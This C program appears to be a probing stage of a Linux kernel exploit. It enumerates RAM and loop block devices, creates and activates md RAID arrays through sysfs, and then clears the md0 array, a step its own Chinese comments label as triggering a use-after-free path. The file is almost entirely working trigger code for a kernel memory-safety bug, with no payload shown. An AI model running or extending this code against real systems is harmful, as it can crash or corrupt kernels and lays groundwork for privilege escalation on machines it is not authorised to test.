#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <linux/loop.h>
#include <sys/mount.h>

static int wr(const char *p, const char *v, int *er)
{
    int fd = open(p, O_WRONLY);
    if (fd < 0) { if (er) *er = errno; return -100 - 0; }
    ssize_t n = write(fd, v, strlen(v));
    int e = errno;
    close(fd);
    if (er) *er = e;
    return n < 0 ? -1 : 0;
}

int main(void)
{
    printf("DIAG start uid=%d\n", getuid());
    fflush(stdout);

    printf("--- 块设备清单 ---\n");
    for (int i = 0; i < 16; i++) {
        char p[64];
        struct stat st;
        snprintf(p, sizeof(p), "/dev/ram%d", i);
        if (stat(p, &st) == 0)
            printf("EXIST %s mode=%o\n", p, st.st_mode & 07777);
    }
    for (int i = 0; i < 8; i++) {
        char p[64];
        struct stat st;
        snprintf(p, sizeof(p), "/dev/loop%d", i);
        if (stat(p, &st) == 0)
            printf("EXIST %s mode=%o\n", p, st.st_mode & 07777);
    }
    struct stat s2;
    printf("blockdir=%s\n", stat("/sys/block", &s2) == 0 ? "yes" : "no");

    printf("--- 创建 md0 并逐级尝试 ---\n");
    int e = 0;
    int r = wr("/sys/module/md_mod/parameters/new_array", "md0", &e);
    printf("new_array rc=%d errno=%d\n", r, e);
    fflush(stdout);

    r = wr("/sys/block/md0/md/level", "raid1", &e);
    printf("level=raid1 rc=%d errno=%d\n", r, e);

    r = wr("/sys/block/md0/md/raid_disks", "1", &e);
    printf("raid_disks=1 rc=%d errno=%d\n", r, e);

    printf("--- 尝试绑定 ram0 ---\n");
    r = wr("/sys/block/md0/md/dev-ram0/slot", "0", &e);
    printf("dev-ram0/slot rc=%d errno=%d\n", r, e);
    r = wr("/sys/block/md0/md/dev-ram0/state", "in_sync", &e);
    printf("dev-ram0/state rc=%d errno=%d\n", r, e);

    r = wr("/sys/block/md0/md/array_state", "active", &e);
    printf("array_state=active rc=%d errno=%d\n", r, e);
    fflush(stdout);

    char buf[128];
    int fd = open("/sys/block/md0/md/array_state", O_RDONLY);
    if (fd >= 0) { int n = read(fd, buf, sizeof(buf) - 1); if (n > 0) { buf[n] = 0; printf("state=%s", buf); } close(fd); }
    fd = open("/sys/block/md0/md/raid_disks", O_RDONLY);
    if (fd >= 0) { int n = read(fd, buf, sizeof(buf) - 1); if (n > 0) { buf[n] = 0; printf("disks=%s", buf); } close(fd); }
    fd = open("/sys/block/md0/md/level", O_RDONLY);
    if (fd >= 0) { int n = read(fd, buf, sizeof(buf) - 1); if (n > 0) { buf[n] = 0; printf("level=%s", buf); } close(fd); }

    printf("--- 尝试 level=linear (不需要成员盘?) ---\n");
    int e2 = 0;
    wr("/sys/module/md_mod/parameters/new_array", "md1", &e2);
    printf("md1 rc=%d errno=%d\n", 0, e2);
    r = wr("/sys/block/md1/md/level", "linear", &e);
    printf("md1 level=linear rc=%d errno=%d\n", r, e);
    r = wr("/sys/block/md1/md/array_state", "active", &e);
    printf("md1 active rc=%d errno=%d\n", r, e);

    printf("--- 尝试 level=raid0 ---\n");
    wr("/sys/module/md_mod/parameters/new_array", "md2", &e2);
    r = wr("/sys/block/md2/md/level", "raid0", &e);
    printf("md2 level=raid0 rc=%d errno=%d\n", r, e);
    r = wr("/sys/block/md2/md/raid_disks", "1", &e);
    printf("md2 raid_disks=1 rc=%d errno=%d\n", r, e);
    r = wr("/sys/block/md2/md/array_state", "active", &e);
    printf("md2 active rc=%d errno=%d\n", r, e);

    printf("--- 尝试 md0 clear (触发 UAF 路径) ---\n");
    r = wr("/sys/block/md0/md/array_state", "clear", &e);
    printf("md0 clear rc=%d errno=%d\n", r, e);

    printf("DIAG done\n");
    fflush(stdout);
    return 0;
}